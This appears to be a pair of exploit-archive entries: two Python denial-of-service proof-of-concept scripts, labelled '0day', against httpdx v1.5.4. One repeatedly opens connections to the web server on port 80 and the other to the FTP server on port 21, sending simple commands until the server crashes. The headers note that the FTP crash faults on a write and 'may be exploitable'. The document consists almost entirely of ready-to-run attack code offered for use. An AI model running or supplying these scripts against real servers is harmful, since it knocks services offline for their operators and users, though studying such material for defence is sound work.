#!/usr/bin/env python

###########################################################################
#
# Title: 	httpdx v1.5.4 Remote HTTP Server DoS (0day)
# By:		Dr_IDE
# Tested:	XPSP3
# Download:	http://httpdx.sourceforge.net
# Note:		Server will totally crash if only running the EXE
# Note:		Get a "ffs what happened?" message if running via BAT
#
############################################################################
#
# Debugging Notes: This may not be exploitable as it dumps on a read operation. 
# Upon crash throws: Access violation when reading [00001238]
#
############################################################################

import socket, sys

payload = ("GET / HTTP/1.1\r\n\r\n");
x=1;

try:
	while (x < 2048):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print ("[*] Connecting to httpdx server.");
		s.connect((sys.argv[1], 80));
		print ("\n[*] Sending command.\n");
		s.send(payload);
		s.close();
		x = x+1;

except:
	print ("[*] Success! We crashed the server in %d attempts." % x);
	print ("[i] [pocoftheday.blogspot.com]");


=====================================================================================

#!/usr/bin/env python

###########################################################################
#
# Title: 	httpdx v1.5.4 Remote FTP Server DoS (0day)
# By:		Dr_IDE
# Tested:	XPSP3
# Download:	http://httpdx.sourceforge.net
# Note:		Server will totally crash if only running the EXE
# Note:		Get a "ffs what happened?" message if running via BAT
#
############################################################################
#
# Debugging Notes: This may be exploitable as it dumps on a write operation. 
# Upon crash throws: Access violation when writing to [00230000]
#
############################################################################

import socket, sys

payload = ("USER anonymous\r\n\r\n");
x=1;

try:
	while (x < 2048):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print ("[*] Connecting to httpdx server.");
		s.connect((sys.argv[1], 21));
		print ("\n[*] Sending command.\n");
		s.send(payload);
		s.close();
		x = x+1;

except:
	print ("[*] Success! We crashed the server in %d attempts." % x);
	print ("[i] [pocoftheday.blogspot.com]");